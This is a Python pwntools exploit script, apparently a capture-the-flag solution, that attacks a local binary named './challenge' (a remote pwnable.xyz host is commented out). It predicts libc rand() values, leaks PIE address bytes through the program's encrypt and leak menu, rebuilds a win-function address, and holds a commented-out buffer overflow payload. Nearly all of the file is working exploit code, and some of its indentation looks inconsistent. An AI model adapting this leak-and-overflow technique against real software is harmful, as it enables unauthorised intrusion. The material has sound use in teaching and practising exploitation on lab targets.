from pwn import *
import ctypes
import random
while(True):
	target=process('./challenge')
	#target=remote('svc.pwnable.xyz',30040)
	lib=ctypes.CDLL('/lib/x86_64-linux-gnu/libc.so.6')
	mapp=[]

	for i in range(0x100):
		lib.srand(i)
		mapp.append(int(hex(lib.rand())[-2:],16))

	def init(option):
		(target.recvuntil("> "))
		target.sendline(str(option))
		
	def seed():
		init(1)

	def encrypt():
		init(2)
		(target.recvuntil(": "))
		target.sendline("\x01")
		
	def leak():
		init(3)
		(target.recvuntil(": "))
		leaks=int(hex((u8(target.recvn(1)[0])+0xff)%0x100),16)
		return leaks


	def getindex(val):
		return (val%8)

	def revleak(val):
		pos=[]
		for i in range(0x100):
			if(mapp[i]==val):
				pos.append(p8(i))
		return pos

	def revleak1(val):
		pos=[]
		for i in range(0x100):
			if(mapp[i]==val and i%0x10==0xa):
				pos.append(p8(i))
		return pos

	leakarr=[["\xd6"],[],[],[],[],["\x55"]]
	done=[1,0,0,0,0,1,1,1]
	check=4
	lib.srand(0)
	flag=0

	while(check!=8):
		while(True):
			randval=lib.rand()
			index=getindex(randval)
			if(done[index]==1):
				encrypt()
				continue
			break
		seed()
		encrypt()
		leaks=leak()
		if(index==1):
			pos=revleak1(leaks)
		else:
			pos=revleak(leaks)
			
		if(len(pos)>1):
			flag=1
			break
	
		leakarr[index].extend(pos)
		#print("This is for index "+str(index))
		#for p in pos:
	#		print(hex(u8(p))),
	#	print(" ")
		done[index]=1
		check+=1
		while(True):
			seed()
			encrypt()
			leaks=leak()
			#print(hex(leaks))
			if(leaks==0x67):
				lib.srand(0)
				lib.rand()
				break
			else:
				for j in range(random.randint(1,5)):
					encrypt()
		
	if(flag==1):
		target.close()
		continue	

	for lists in leakarr:
		for p in lists:
			print(hex(u8(p))),
		print(" ")

	print(" ")
	print(" ")
	print(" ")
	randval=lib.rand()%0x100
	print(hex(randval))
	pie_win=""
	pie_winr=""
	for p in leakarr:
		pie_winr+=p[0]
		pie_win+=p8(int(hex((u8(p[0])+0x100-randval)%0x100),16))

	print(hex(u64(pie_winr.ljust(8,"\x00"))))
	print(hex(u64(pie_win.ljust(8,"\x00"))))

	print(" ")
	print(" ")
	print(" ")
	print(" ")
	print(" ")
	print(" ")
	print(" ")
	print(" ")
	print(" ")
	print(" ")
	print(" ")
	print(" ")

	def REVLEAK(val):
		pos=-1
		for i in range(0x100):
			if(mapp[i]==val):
				pos=(p8(i))
				break
		return pos

	def REVLEAK1(val):
		pos=-1
		for i in range(0x100):
			if(mapp[i]==val and i%0x10==0xa):
				pos=(p8(i))
				break
		return pos

	LEAKARR=["\xd6","\x00","\x00","\x00","\x00","\x55"]
	DONE=[1,0,0,0,0,1,1,1]
	CHECK=4
	lib.srand(0)
	lib.rand()
	while(CHECK!=8):
		while(True):
			RANDVAL=lib.rand()
			index=getindex(RANDVAL)
			if(DONE[index]==1):
				encrypt()
				continue
			break
		seed()
		encrypt()
		leaks=leak()
		if(index==1):
			pos=REVLEAK1(leaks)
		else:
			pos=REVLEAK(leaks)
			
	
		LEAKARR[index]=pos
		DONE[index]=1
		CHECK+=1
		lib.srand(u8(pos))
		lib.rand()
			

	RANDVAL=lib.rand()%0x100
	print(hex(RANDVAL))
	PIE_WIN=""
	PIE_WINr=""
	for p in LEAKARR:
		PIE_WINr+=p
                PIE_WIN+=p8(int(hex((u8(p)+0x100-RANDVAL)%0x100),16))

        print(hex(u64(PIE_WINr.ljust(8,"\x00"))))
        print(hex(u64(PIE_WIN.ljust(8,"\x00"))))
	
	'''
	init(2)
	target.recvuntil(": ")
	payload="A"*0x98+pie_win
	target.sendline(payload)
	init(0)
	'''
	target.interactive()
